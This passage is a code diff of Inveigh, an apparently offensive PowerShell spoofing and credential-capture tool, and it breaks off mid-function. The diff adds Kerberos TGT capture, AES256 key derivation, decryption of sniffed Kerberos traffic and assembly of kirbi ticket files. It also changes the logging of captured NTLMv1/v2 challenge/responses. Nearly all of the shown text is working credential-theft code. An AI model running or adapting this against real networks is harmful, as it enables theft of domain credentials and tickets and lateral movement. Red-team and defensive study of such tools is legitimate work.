@@ -144,6 +144,23 @@ enabled.
 Local IP address for listening and packet sniffing. This IP address will also be used for LLMNR/NBNS/mDNS/DNS spoofing
 if the SpooferIP parameter is not set.
 
+.PARAMETER Kerberos
+Default = Disabled: (Y/N) Enable/Disable experimental Kerberos TGT capture and kirbi file output through unconstrained
+delegation and packet sniffing. 
+
+.PARAMETER KerberosCount
+Default = 2: The number of kirbi files that will be created per username.
+
+.PARAMETER KerberosCredential
+Credentials that will be used to decrypt Kerberos TGT captures. This is not required if using KerberosHash. The username
+should be entered in Kerberos salt format:
+AD username format = uppercase realm + case sensitive username (e.g., TEST.LOCALusername, TEST.LOCALAdministrator)
+AD hostname format = uppercase realm + the word host + lowercase hostname without the trailing '$' + . + lowercase
+realm (e.g., TEST.LOCALhostwks1.test.local)
+
+.PARAMETER KerberosHash
+AES256 password hash that will be used to decrypt Kerberos TGT captures. This is not required if using KerberosCredential.
+
 .PARAMETER LogOutput
 Default = Enabled: (Y/N) Enable/Disable storing log messages in memory.
 
@@ -381,6 +398,7 @@ param
     [parameter(Mandatory=$false)][Int]$ADIDNSTTL = "600",
     [parameter(Mandatory=$false)][Int]$HTTPPort = "80",
     [parameter(Mandatory=$false)][Int]$HTTPSPort = "443",
+    [parameter(Mandatory=$false)][Int]$KerberosCount = "2",
     [parameter(Mandatory=$false)][Int]$LLMNRTTL = "30",
     [parameter(Mandatory=$false)][Int]$mDNSTTL = "120",
     [parameter(Mandatory=$false)][Int]$NBNSTTL = "165",
@@ -417,6 +435,7 @@ param
     [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$HTTP = "Y",
     [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$HTTPS = "N",
     [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$HTTPSForceCertDelete = "N",
+    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$Kerberos = "Y",
     [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$LLMNR = "Y",
     [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$LogOutput = "Y",
     [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$MachineAccounts = "N",
@@ -442,9 +461,9 @@ param
     [parameter(Mandatory=$false)][ValidateSet("Basic","NTLM","NTLMNoESS")][String]$ProxyAuth = "NTLM",
     [parameter(Mandatory=$false)][ValidateSet("0","1","2")][String]$Tool = "0",
     [parameter(Mandatory=$false)][ValidateSet("Anonymous","Basic","NTLM","NTLMNoESS")][String]$WPADAuth = "NTLM",
+    [parameter(Mandatory=$false)][ValidateScript({$_.Length -eq 64})][String]$KerberosHash,
     [parameter(Mandatory=$false)][ValidateScript({Test-Path $_})][String]$FileOutputDirectory = "",
     [parameter(Mandatory=$false)][ValidateScript({Test-Path $_})][String]$HTTPDir = "",
-    [parameter(Mandatory=$false)][Switch]$Inspect,
     [parameter(Mandatory=$false)][ValidateScript({$_ -match [System.Net.IPAddress]$_})][String]$HTTPIP = "0.0.0.0",
     [parameter(Mandatory=$false)][ValidateScript({$_ -match [System.Net.IPAddress]$_})][String]$IP = "",
     [parameter(Mandatory=$false)][ValidateScript({$_ -match [System.Net.IPAddress]$_})][String]$NBNSBruteForceTarget = "",
@@ -452,6 +471,8 @@ param
     [parameter(Mandatory=$false)][ValidateScript({$_ -match [System.Net.IPAddress]$_})][String]$SpooferIP = "",
     [parameter(Mandatory=$false)][ValidateScript({$_ -match [System.Net.IPAddress]$_})][String]$WPADIP = "",
     [parameter(Mandatory=$false)][System.Management.Automation.PSCredential]$ADIDNSCredential,
+    [parameter(Mandatory=$false)][System.Management.Automation.PSCredential]$KerberosCredential,
+    [parameter(Mandatory=$false)][Switch]$Inspect,
     [parameter(ValueFromRemainingArguments=$true)]$invalid_parameter
 )
 
@@ -463,7 +484,7 @@ if($invalid_parameter)
     throw
 }
 
-$inveigh_version = "1.4.1"
+$inveigh_version = "1.5"
 
 if(!$IP)
 { 
@@ -536,6 +557,12 @@ if($HTTPDefaultFile -or $HTTPDefaultEXE)
 
 }
 
+if($Kerberos -and !$KerberosCredential -and !$KerberosHash)
+{
+    Write-Output "[-] You must specify a -KerberosCredential or -KerberosHash when enabling Kerberos capture"
+    throw
+}
+
 if($WPADIP -or $WPADPort)
 {
 
@@ -575,6 +602,9 @@ if(!$inveigh)
     $inveigh.enumerate = New-Object System.Collections.ArrayList
     $inveigh.IP_capture_list = New-Object System.Collections.ArrayList
     $inveigh.log = New-Object System.Collections.ArrayList
+    $inveigh.kerberos_packet_list = New-Object System.Collections.ArrayList
+    $inveigh.kerberos_TGT_list = New-Object System.Collections.ArrayList
+    $inveigh.kerberos_TGT_username_list = New-Object System.Collections.ArrayList
     $inveigh.NTLMv1_list = New-Object System.Collections.ArrayList
     $inveigh.NTLMv1_username_list = New-Object System.Collections.ArrayList
     $inveigh.NTLMv2_list = New-Object System.Collections.ArrayList
@@ -595,6 +625,7 @@ if(!$inveigh)
     $inveigh.group_table = [HashTable]::Synchronized(@{})
     $inveigh.session_count = 0
     $inveigh.session = @()
+    $inveigh.kerberos_index = 0
 }
 
 if($inveigh.running)
@@ -692,6 +723,18 @@ if(!$elevated_privilege)
     if($SpooferLearning -eq 'Y')
     {
         Write-Output "[-] SpooferLearning requires elevated privileges"
+        throw
+    }
+
+    if($PcapOutput -eq 'File')
+    {
+        Write-Output "[-] Pcap file output requires elevated privileges"
+        throw
+    }
+
+    if($Kerberos -eq 'Y')
+    {
+        Write-Output "[-] Kerberos TGT capture requires elevated privileges"
         throw
     }
 
@@ -1050,10 +1093,17 @@ else
 if($SMB -eq 'Y' -and $elevated_privilege)
 {
     $inveigh.output_queue.Add("[+] SMB Capture = Enabled")  > $null
+
+    if($Kerberos -eq 'Y')
+    {
+        $inveigh.output_queue.Add("[+] SMB Kerberos TGT Capture = Enabled")  > $null
+    }
+
 }
 else
 {
     $inveigh.output_queue.Add("[+] SMB Capture = Disabled")  > $null
+    $inveigh.output_queue.Add("[+] SMB Kerberos TGT Capture = Disabled")  > $null
 }
 
 if($HTTP -eq 'Y')
@@ -1400,7 +1450,7 @@ else
     $inveigh.console_unique = $false
 }
 
-if($FileOutput -eq 'Y' -or ($PcapOutput -eq 'File' -and ($PcapPortTCP -or $PcapPortUDP)))
+if($FileOutput -eq 'Y' -or $KerberosCount -gt 0 -or ($PcapOutput -eq 'File' -and ($PcapPortTCP -or $PcapPortUDP)))
 {
     
     if($FileOutput -eq 'Y')
@@ -2579,13 +2629,22 @@ $SMB_NTLM_functions_scriptblock =
             $inveigh.SMB_session_table.Add($Session,"")
         }
 
-        $SMB_index = $payload_converted.IndexOf("2A864886F712010202")
+        $SMB_index = $payload_converted.IndexOf("2A864886F7120102020100")
 
         if($SMB_index -gt 0)
         {
             $inveigh.output_queue.Add("[+] [$(Get-Date -format s)] SMB($Port) authentication method is Kerberos for $Session") > $null
+
+            if($Kerberos -eq 'Y')
+            {
+                $kerberos_length = Get-UInt16DataLength 0 $Payload[82..83]
+                $kerberos_length -= $SMB_index / 2
+                $inveigh.kerberos_packet_list.Add($Payload[($SMB_index/2)..($SMB_index/2 + $Payload.Count)]) > $null
+            }
+
         }
 
+        return $kerberos_length
     }
 
     function Get-SMBNTLMChallenge
@@ -2710,11 +2769,11 @@ $SMB_NTLM_functions_scriptblock =
 
                     if(!$inveigh.console_unique -or ($inveigh.console_unique -and $inveigh.NTLMv2_username_list -notcontains "$source_IP $NTLM_domain_string\$NTLM_user_string"))
                     {
-                        $inveigh.output_queue.Add("[+] [$(Get-Date -format s)] SMB($Port) NTLMv2 challenge/response captured from $source_IP($NTLM_host_string):`n$NTLMv2_hash") > $null
+                        $inveigh.output_queue.Add("[+] [$(Get-Date -format s)] SMB($Port) NTLMv2 challenge/response captured from $source_IP($NTLM_host_string)`:$source_port`:`n$NTLMv2_hash") > $null
                     }
                     else
                     {
-                        $inveigh.output_queue.Add("[+] [$(Get-Date -format s)] SMB($Port) NTLMv2 challenge/response captured from $source_IP($NTLM_host_string):`n$NTLM_domain_string\$NTLM_user_string [not unique]") > $null
+                        $inveigh.output_queue.Add("[+] [$(Get-Date -format s)] SMB($Port) NTLMv2 challenge/response captured from $source_IP($NTLM_host_string)`:$source_port`:`n$NTLM_domain_string\$NTLM_user_string [not unique]") > $null
                     }
 
                     if($inveigh.file_output -and (!$inveigh.file_unique -or ($inveigh.file_unique -and $inveigh.NTLMv2_username_list -notcontains "$source_IP $NTLM_domain_string\$NTLM_user_string")))
@@ -2746,11 +2805,11 @@ $SMB_NTLM_functions_scriptblock =
 
                     if(!$inveigh.console_unique -or ($inveigh.console_unique -and $inveigh.NTLMv1_username_list -notcontains "$source_IP $NTLM_domain_string\$NTLM_user_string"))
                     {
-                        $inveigh.output_queue.Add("[+] [$(Get-Date -format s)] SMB($Port) NTLMv1 challenge/response captured from $source_IP($NTLM_host_string):`n$NTLMv1_hash") > $null
+                        $inveigh.output_queue.Add("[+] [$(Get-Date -format s)] SMB($Port) NTLMv1 challenge/response captured from $source_IP($NTLM_host_string)`:$source_port`:`n$NTLMv1_hash") > $null
                     }
                     else
                     {
-                        $inveigh.output_queue.Add("[+] [$(Get-Date -format s)] SMB($Port) NTLMv1 challenge/response captured from $source_IP($NTLM_host_string):`n$NTLM_domain_string\$NTLM_user_string [not unique]") > $null
+                        $inveigh.output_queue.Add("[+] [$(Get-Date -format s)] SMB($Port) NTLMv1 challenge/response captured from $source_IP($NTLM_host_string)`:$source_port`:`n$NTLM_domain_string\$NTLM_user_string [not unique]") > $null
                     }
 
                     if($inveigh.file_output -and (!$inveigh.file_unique -or ($inveigh.file_unique -and $inveigh.NTLMv1_username_list -notcontains "$source_IP $NTLM_domain_string\$NTLM_user_string")))
@@ -2774,10 +2833,467 @@ $SMB_NTLM_functions_scriptblock =
             }
             elseif($NTLM_length -eq 0)
             {
-                $inveigh.output_queue.Add("[+] [$(Get-Date -format s)] SMB($Port) NTLM null response from $source_IP($NTLM_host_string)") > $null
+                $inveigh.output_queue.Add("[+] [$(Get-Date -format s)] SMB($Port) NTLM null response from $source_IP($NTLM_host_string)`:$source_port") > $null
             }
 
             Invoke-SessionUpdate $NTLM_domain_string $NTLM_user_string $NTLM_host_string $source_IP
+        }
+
+    }
+
+    function Get-KerberosAES256BaseKey
+    {
+        param([String]$salt,[System.Security.SecureString]$password)
+
+        $password_BSTR = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($password)
+        $password_cleartext = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($password_BSTR)
+        [Byte[]]$salt = [System.Text.Encoding]::UTF8.GetBytes($salt)
+        [Byte[]]$password_cleartext = [System.Text.Encoding]::UTF8.GetBytes($password_cleartext)
+        $constant = 0x6B,0x65,0x72,0x62,0x65,0x72,0x6F,0x73,0x7B,0x9B,0x5B,0x2B,0x93,0x13,0x2B,0x93,0x5C,0x9B,0xDC,0xDA,0xD9,0x5C,0x98,0x99,0xC4,0xCA,0xE4,0xDE,0xE6,0xD6,0xCA,0xE4
+        $PBKDF2 = New-Object Security.Cryptography.Rfc2898DeriveBytes($password_cleartext,$salt,4096)
+        Remove-Variable password_cleartext
+        $PBKDF2_key = $PBKDF2.GetBytes(32)
+        $AES = New-Object "System.Security.Cryptography.AesManaged"
+        $AES.Mode = [System.Security.Cryptography.CipherMode]::CBC
+        $AES.Padding = [System.Security.Cryptography.PaddingMode]::None
+        $AES.IV = 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
+        $AES.KeySize = 256
+        $AES.Key = $PBKDF2_key
+        $AES_encryptor = $AES.CreateEncryptor()
+        $base_key_part_1 = $AES_encryptor.TransformFinalBlock($constant,0,$constant.Length)
+        $base_key_part_2 = $AES_encryptor.TransformFinalBlock($base_key_part_1,0,$base_key_part_1.Length)
+        $base_key = $base_key_part_1[0..15] + $base_key_part_2[0..15]
+
+        return $base_key
+    }
+
+    function Get-KerberosAES256UsageKey
+    {
+        param([String]$key_type,[Int]$usage_number,[Byte[]]$base_key)
+
+        $padding = 0x00 * 16
+
+        if($key_type -eq 'checksum')
+        {
+            switch($usage_number) 
+            {
+                25 {[Byte[]]$usage_constant = 0x5d,0xfb,0x7d,0xbf,0x53,0x68,0xce,0x69,0x98,0x4b,0xa5,0xd2,0xe6,0x43,0x34,0xba + $padding}
+            }
+        }
+        elseif($key_type -eq 'encrypt')
+        {
+
+            switch($usage_number) 
+            {
+                1 {[Byte[]]$usage_constant = 0xae,0x2c,0x16,0x0b,0x04,0xad,0x50,0x06,0xab,0x55,0xaa,0xd5,0x6a,0x80,0x35,0x5a + $padding}
+                2 {[Byte[]]$usage_constant = 0xb5,0xb0,0x58,0x2c,0x14,0xb6,0x50,0x0a,0xad,0x56,0xab,0x55,0xaa,0x80,0x55,0x6a + $padding}
+                3 {[Byte[]]$usage_constant = 0xbe,0x34,0x9a,0x4d,0x24,0xbe,0x50,0x0e,0xaf,0x57,0xab,0xd5,0xea,0x80,0x75,0x7a + $padding}
+                4 {[Byte[]]$usage_constant = 0xc5,0xb7,0xdc,0x6e,0x34,0xc7,0x51,0x12,0xb1,0x58,0xac,0x56,0x2a,0x80,0x95,0x8a + $padding}
+                7 {[Byte[]]$usage_constant = 0xde,0x44,0xa2,0xd1,0x64,0xe0,0x51,0x1e,0xb7,0x5b,0xad,0xd6,0xea,0x80,0xf5,0xba + $padding}
+                11 {[Byte[]]$usage_constant = 0xfe,0x54,0xaa,0x55,0xa5,0x02,0x52,0x2f,0xbf,0x5f,0xaf,0xd7,0xea,0x81,0x75,0xfa + $padding}
+                12 {[Byte[]]$usage_constant = 0x05,0xd7,0xec,0x76,0xb5,0x0b,0x53,0x33,0xc1,0x60,0xb0,0x58,0x2a,0x81,0x96,0x0b + $padding}
+                14 {[Byte[]]$usage_constant = 0x15,0xe0,0x70,0xb8,0xd5,0x1c,0x53,0x3b,0xc5,0x62,0xb1,0x58,0xaa,0x81,0xd6,0x2b + $padding}
+            }
+                
+        }
+        elseif($key_type -eq 'integrity') 
+        {
+            
+            switch($usage_number) 
+            {
+                1 {[Byte[]]$usage_constant = 0x5b,0x58,0x2c,0x16,0x0a,0x5a,0xa8,0x05,0x56,0xab,0x55,0xaa,0xd5,0x40,0x2a,0xb5 + $padding}
+                4 {[Byte[]]$usage_constant = 0x72,0xe3,0xf2,0x79,0x3a,0x74,0xa9,0x11,0x5c,0xae,0x57,0x2b,0x95,0x40,0x8a,0xe5 + $padding}
+                7 {[Byte[]]$usage_constant = 0x8b,0x70,0xb8,0xdc,0x6a,0x8d,0xa9,0x1d,0x62,0xb1,0x58,0xac,0x55,0x40,0xeb,0x15 + $padding}
+                11 {[Byte[]]$usage_constant = 0xab,0x80,0xc0,0x60,0xaa,0xaf,0xaa,0x2e,0x6a,0xb5,0x5a,0xad,0x55,0x41,0x6b,0x55 + $padding}
+            }
+
+        }
+
+        $AES = New-Object "System.Security.Cryptography.AesManaged"
+        $AES.Mode = [System.Security.Cryptography.CipherMode]::CBC
+        $AES.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
+        $AES.IV = 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
+        $AES.KeySize = 256
+        $AES.Key = $base_key
+        $AES_encryptor = $AES.CreateEncryptor()
+        $usage_key = $AES_encryptor.TransformFinalBlock($usage_constant,0,$usage_constant.Length)
+
+        return $usage_key
+    }
+
+    function Get-ASN1Length
+    {
+        param ([Byte[]]$asn1)
+    
+        $i = 0
+    
+        while ($asn1[$i] -ne 3 -and $asn1[$i] -ne 129 -and $asn1[$i] -ne 130 -and $asn1[$i] -ne 131 -and $asn1[$i] -ne 132 -and $i -lt 1)
+        {
+            $i++   
+        }
+    
+        switch ($asn1[$i]) 
+        {
+            
+            3
+            { 
+                $i += 3 
+                $length = $asn1[$i]
+                $i++
+            }
+    
+            129
+            {
+                $i += 1
+                $length = $asn1[$i]
+                $i++
+            }
+    
+            130
+            {
+                $i += 2
+                $length = Get-UInt16DataLength 0 $asn1[($i)..($i - 1)]
+                $i++
+            }
+    
+            131
+            {
+                $i += 3
+                $length = Get-UInt32DataLength 0 ($asn1[($i)..($i - 2)] + 0x00)
+                $i++
+            }
+    
+            132
+            {
+                $i += 4
+                $length = Get-UInt32DataLength 0 $asn1[($i)..($i - 3)]
+                $i++
+            }
+    
+        }
+    
+        return $i,$length
+    }
+
+    function Unprotect-Kerberos
+    {
+        param([Byte[]]$ke_key,[Byte[]]$encrypted_data)
+
+        $final_block_length = [Math]::Truncate($encrypted_data.Count % 16)
+        [Byte[]]$final_block = $encrypted_data[($encrypted_data.Count - $final_block_length)..$encrypted_data.Count]
+        [Byte[]]$penultimate_block = $encrypted_data[($encrypted_data.Count - $final_block_length - 16)..($encrypted_data.Count - $final_block_length - 1)]
+        $AES = New-Object "System.Security.Cryptography.AesManaged"
+        $AES.Mode = [System.Security.Cryptography.CipherMode]::CBC
+        $AES.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
+        $AES.IV = 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
+        $AES.KeySize = 256
+        $AES.Key = $ke_key
+        $AES_decryptor = $AES.CreateDecryptor()
+        $penultimate_block_cleartext = $AES_decryptor.TransformFinalBlock($penultimate_block,0,$penultimate_block.Length)
+        [Byte[]]$final_block_padding = $penultimate_block_cleartext[$final_block_length..$penultimate_block_cleartext.Count]
+        $final_block += $final_block_padding
+        [Byte[]]$cts_encrypted_data = $encrypted_data[0..($encrypted_data.Count - $final_block_length - 17)] + $final_block + $penultimate_block
+        [Byte[]]$cleartext = $AES_decryptor.TransformFinalBlock($cts_encrypted_data,0,$cts_encrypted_data.Length)
+
+        return $cleartext
+    }
+
+    function Get-Kirbi
+    {
+        param([Byte[]]$kirbi2,[Byte[]]$kirbi3)
+    
+        [Byte[]]$kirbi = $kirbi2 + $kirbi3
+        $kirbi = 0x30,0x84 + [System.BitConverter]::GetBytes($kirbi.Count)[3..0] + $kirbi
+        $kirbi = 0x76,0x84 + [System.BitConverter]::GetBytes($kirbi.Count)[3..0] + $kirbi
+    
+        return $kirbi
+    }
+    function Get-KirbiPartTwo
+    {
+        param([Byte[]]$cleartext)
+    
+        $ASN1 = Get-ASN1Length $cleartext[4..9]
+        $ASN1_length = $ASN1[0]
+        $ASN1 = Get-ASN1Length $cleartext[($ASN1_length + 4)..($ASN1_length + 9)]
+        $ASN1_length += $ASN1[0]
+        $realm_length = $cleartext[($ASN1_length + 7)]
+        $username_length = $cleartext[($ASN1_length + $realm_length + 22)]
+        $field_length = $realm_length + $username_length
+        $ASN1 = Get-ASN1Length $cleartext[($ASN1_length + $field_length + 74)..($ASN1_length + $field_length + 79)]
+        $ASN1_length += $ASN1[0]
+        $ASN1 = Get-ASN1Length $cleartext[($ASN1_length + $field_length + 74)..($ASN1_length + $field_length + 79)]
+        $ASN1_length += $ASN1[0]
+        $ASN1 = Get-ASN1Length $cleartext[($ASN1_length + $field_length + 74)..($ASN1_length + $field_length + 79)]
+        $ASN1_length += $ASN1[0]
+        $pvno = $cleartext[($ASN1_length + $field_length + 73)]
+        $ASN1 = Get-ASN1Length $cleartext[($ASN1_length + $field_length + 74)..($ASN1_length + $field_length + 79)]
+        $ASN1_length += $ASN1[0]
+        $ASN1 = Get-ASN1Length $cleartext[($ASN1_length + $field_length + 74)..($ASN1_length + $field_length + 79)]
+        $ASN1_length += $ASN1[0]
+        $ASN1 = Get-ASN1Length $cleartext[($ASN1_length + $field_length + 74)..($ASN1_length + $field_length + 79)]
+        $ASN1_length += $ASN1[0]
+        $ASN1 = Get-ASN1Length $cleartext[($ASN1_length + $field_length + 74)..($ASN1_length + $field_length + 79)]
+        $ASN1_length += $ASN1[0]
+        $ASN1 = Get-ASN1Length $cleartext[($ASN1_length + $field_length + 74)..($ASN1_length + $field_length + 79)]
+        $ASN1_length += $ASN1[0]
+        $ASN1 = Get-ASN1Length $cleartext[($ASN1_length + $field_length + 74)..($ASN1_length + $field_length + 79)]
+        $ASN1_length += $ASN1[0]
+        $tkt_vno = $cleartext[($ASN1_length + $field_length + 73)]
+        $realm2_length = $cleartext[($ASN1_length + $field_length + 75)]
+        [Byte[]]$realm2 = $cleartext[($ASN1_length + $field_length + 76)..($ASN1_length + $field_length + $realm2_length + 75)]
+        $field_length += $realm2_length
+        $sname_string_length = $cleartext[($ASN1_length + $field_length + 88)]
+        [Byte[]]$sname_string = $cleartext[($ASN1_length + $field_length + 89)..($ASN1_length + $field_length + $sname_string_length + 88)]
+        $field_length += $sname_string_length
+        $ASN1 = Get-ASN1Length $cleartext[($ASN1_length + $field_length + 89)..($ASN1_length + $field_length + 94)]
+        $ASN1_length += $ASN1[0]
+        $ASN1 = Get-ASN1Length $cleartext[($ASN1_length + $field_length + 89)..($ASN1_length + $field_length + 94)]
+        $ASN1_length += $ASN1[0]
+        $ASN1 = Get-ASN1Length $cleartext[($ASN1_length + $field_length + 89)..($ASN1_length + $field_length + 94)]
+        $ASN1_length += $ASN1[0]
+        $ASN1 = Get-ASN1Length $cleartext[($ASN1_length + $field_length + 89)..($ASN1_length + $field_length + 94)]
+        $ASN1_length += $ASN1[0]
+        $kvno = $cleartext[($ASN1_length + $field_length + 88)]
+        $ASN1 = Get-ASN1Length $cleartext[($ASN1_length + $field_length + 89)..($ASN1_length + $field_length + 94)]
+        $ASN1_length += $ASN1[0]
+        $ASN1 = Get-ASN1Length $cleartext[($ASN1_length + $field_length + 89)..($ASN1_length + $field_length + 94)]
+        $ASN1_length += $ASN1[0]
+        $cipher_length = $ASN1[1]
+        [Byte[]]$cipher = $cleartext[($ASN1_length + $field_length + 89)..($ASN1_length + $field_length + $cipher_length + 88)]
+        [Byte[]]$kirbi = 0x04,0x82 + [System.BitConverter]::GetBytes($cipher.Count)[1..0] + $cipher
+        $kirbi = 0xA2,0x84 + [System.BitConverter]::GetBytes($kirbi.Count)[3..0] + $kirbi
+        $kirbi = 0xA0,0x84,0x00,0x00,0x00,0x03,0x02,0x01,0x12,0xA1,0x84,0x00,0x00,0x00,0x03,0x02,0x01 + $kvno + $kirbi
+        $kirbi = 0x30,0x84 + [System.BitConverter]::GetBytes($kirbi.Count)[3..0] + $kirbi
+        $kirbi = 0xA3,0x84 + [System.BitConverter]::GetBytes($kirbi.Count)[3..0] + $kirbi
+        [Byte[]]$kirbi2 = 0x30,0x84 + [System.BitConverter]::GetBytes($sname_string.Count)[3..0] + $sname_string
+        $kirbi2 = 0xA1,0x84 + [System.BitConverter]::GetBytes($kirbi2.Count)[3..0] + $kirbi2
+        $kirbi2 = 0xA0,0x84,0x00,0x00,0x00,0x03,0x02,0x01,0x02 + $kirbi2
+        $kirbi2 = 0x30,0x84 + [System.BitConverter]::GetBytes($kirbi2.Count)[3..0] + $kirbi2
+        $kirbi2 = 0xA2,0x84 + [System.BitConverter]::GetBytes($kirbi2.Count)[3..0] + $kirbi2
+        [Byte[]]$kirbi3 = 0xA1,0x84 + [System.BitConverter]::GetBytes($realm2.Count)[3..0] + $realm2
+        $kirbi3 = 0xA0,0x84,0x00,0x00,0x00,0x03,0x02,0x01 + $tkt_vno + $kirbi3
+        [Byte[]]$kirbi4 = $kirbi3 + $kirbi2 + $kirbi
+        $kirbi4 = 0x30,0x84 + [System.BitConverter]::GetBytes($kirbi4.Count)[3..0] + $kirbi4
+        $kirbi4 = 0x61,0x84 + [System.BitConverter]::GetBytes($kirbi4.Count)[3..0] + $kirbi4
+        $kirbi4 = 0x30,0x84 + [System.BitConverter]::GetBytes($kirbi4.Count)[3..0] + $kirbi4
+        $kirbi4 = 0xA2,0x84 + [System.BitConverter]::GetBytes($kirbi4.Count)[3..0] + $kirbi4
+        $kirbi4 = 0xA1,0x84,0x00,0x00,0x00,0x03,0x02,0x01,0x16 + $kirbi4
+        $kirbi4 = 0xA0,0x84,0x00,0x00,0x00,0x03,0x02,0x01 + $pvno + $kirbi4
+    
+        return $kirbi4
+    }
+    
+    function Get-KirbiPartThree
+    {
+        param([Byte[]]$cleartext)
+    
+        $ASN1 = Get-ASN1Length $cleartext[0..($ASN1_length + 5)]
+        $ASN1_length = $ASN1[0]
+        $ASN1 = Get-ASN1Length $cleartext[$ASN1_length..($ASN1_length + 5)]
+        $ASN1_length += $ASN1[0]
+        $ASN1 = Get-ASN1Length $cleartext[$ASN1_length..($ASN1_length + 5)]
+        $ASN1_length += $ASN1[0]
+        $ASN1 = Get-ASN1Length $cleartext[$ASN1_length..($ASN1_length + 5)]
+        $ASN1_length += $ASN1[0]
+        $ASN1 = Get-ASN1Length $cleartext[$ASN1_length..($ASN1_length + 5)]
+        $ASN1_length += $ASN1[0]
+        [Byte[]]$key = $cleartext[($ASN1_length + 11)..($ASN1_length + 44)]
+        $prerealm_length = $cleartext[($ASN1_length + 46)]
+        [Byte[]]$prerealm = $cleartext[($ASN1_length + 47)..($ASN1_length + $prerealm_length + 46)]
+        $pname_length = $cleartext[($ASN1_length + $prerealm_length + 59)]
+        $field_length = $prerealm_length + $pname_length
+        [Byte[]]$pname = $cleartext[($ASN1_length + $prerealm_length + 60)..($ASN1_length + $field_length + 59)]
+        [Byte[]]$flags = $cleartext[($ASN1_length + $field_length + 65)..($ASN1_length + $field_length + 68)]
+        [Byte[]]$starttime = $cleartext[($ASN1_length + $field_length + 71)..($ASN1_length + $field_length + 87)]
+        [Byte[]]$endtime = $cleartext[($ASN1_length + $field_length + 90)..($ASN1_length + $field_length + 106)]
+        [Byte[]]$renew_till = $cleartext[($ASN1_length + $field_length + 109)..($ASN1_length + $field_length + 125)]
+        $srealm_length = $cleartext[($ASN1_length + $field_length + 127)]
+        [Byte[]]$srealm = $cleartext[($ASN1_length + $field_length + 128)..($ASN1_length + $field_length + $srealm_length + 127)]
+        $field_length += $srealm_length
+        $sname_string_length = $cleartext[($ASN1_length + $field_length + 140)]
+        [Byte[]]$sname_string = $cleartext[($ASN1_length + $field_length + 141)..($ASN1_length + $field_length + $sname_string_length + 140)]
+        [Byte[]]$kirbi = 0x30,0x84 + [System.BitConverter]::GetBytes($sname_string.Count)[3..0] + $sname_string
+        $kirbi = 0xA1,0x84 + [System.BitConverter]::GetBytes($kirbi.Count)[3..0] + $kirbi
+        $kirbi = 0xA0,0x84,0x00,0x00,0x00,0x03,0x02,0x01,0x02 + $kirbi
+        $kirbi = 0x30,0x84 + [System.BitConverter]::GetBytes($kirbi.Count)[3..0] + $kirbi
+        $kirbi = 0xA9,0x84 + [System.BitConverter]::GetBytes($kirbi.Count)[3..0] + $kirbi
+        $kirbi = 0xA8,0x84 + [System.BitConverter]::GetBytes($srealm.Count)[3..0] + $srealm + $kirbi
+        $kirbi = 0xA7,0x84 + [System.BitConverter]::GetBytes($renew_till.Count)[3..0] + $renew_till + $kirbi
+        $kirbi = 0xA6,0x84 + [System.BitConverter]::GetBytes($endtime.Count)[3..0] + $endtime + $kirbi
+        $kirbi = 0xA5,0x84 + [System.BitConverter]::GetBytes($starttime.Count)[3..0] + $starttime + $kirbi
+        $kirbi = 0xA3,0x84,0x00,0x00,0x00,0x07,0x03,0x05,0x00 + $flags + $kirbi
+        [Byte[]]$kirbi2 = 0x30,0x84 + [System.BitConverter]::GetBytes($pname.Count)[3..0] + $pname
+        $kirbi2 = 0xA1,0x84 + [System.BitConverter]::GetBytes($kirbi2.Count)[3..0] + $kirbi2
+        $kirbi2 = 0xA0,0x84,0x00,0x00,0x00,0x03,0x02,0x01,0x01 + $kirbi2
+        $kirbi2 = 0x30,0x84 + [System.BitConverter]::GetBytes($kirbi2.Count)[3..0] + $kirbi2
+        $kirbi2 = 0xA2,0x84 + [System.BitConverter]::GetBytes($kirbi2.Count)[3..0] + $kirbi2
+        $kirbi2 = 0xA1,0x84 + [System.BitConverter]::GetBytes($prerealm.Count)[3..0] + $prerealm + $kirbi2
+        [Byte[]]$kirbi3 = 0xA1,0x84 + [System.BitConverter]::GetBytes($key.Count)[3..0] + $key
+        $kirbi3 = 0xA0,0x84,0x00,0x00,0x00,0x03,0x02,0x01,0x12 + $kirbi3
+        $kirbi3 = 0x30,0x84 + [System.BitConverter]::GetBytes($kirbi3.Count)[3..0] + $kirbi3
+        $kirbi3 = 0xA0,0x84 + [System.BitConverter]::GetBytes($kirbi3.Count)[3..0] + $kirbi3
+        [Byte[]]$kirbi4 = $kirbi3 + $kirbi2 + $kirbi
+        $kirbi4 = 0x30,0x84 + [System.BitConverter]::GetBytes($kirbi4.Count)[3..0] + $kirbi4
+        $kirbi4 = 0x30,0x84 + [System.BitConverter]::GetBytes($kirbi4.Count)[3..0] + $kirbi4
+        $kirbi4 = 0xA0,0x84 + [System.BitConverter]::GetBytes($kirbi4.Count)[3..0] + $kirbi4
+        $kirbi4 = 0x30,0x84 + [System.BitConverter]::GetBytes($kirbi4.Count)[3..0] + $kirbi4
+        $kirbi4 = 0x7D,0x84 + [System.BitConverter]::GetBytes($kirbi4.Count)[3..0] + $kirbi4
+        $kirbi4 = 0x04,0x82 + [System.BitConverter]::GetBytes($kirbi4.Count)[1..0] + $kirbi4
+        $kirbi4 = 0xA2,0x84 + [System.BitConverter]::GetBytes($kirbi4.Count)[3..0] + $kirbi4
+        $kirbi4 = 0xA0,0x84,0x00,0x00,0x00,0x03,0x02,0x01,0x00 + $kirbi4
+        $kirbi4 = 0x30,0x84 + [System.BitConverter]::GetBytes($kirbi4.count)[3..0] + $kirbi4
+        $kirbi4 = 0xA3,0x84 + [System.BitConverter]::GetBytes($kirbi4.count)[3..0] + $kirbi4
+    
+        return $kirbi4
+    }
+
+    function New-KerberosKirbi
+    {
+        param([Byte[]]$base_key,[String]$port)
+
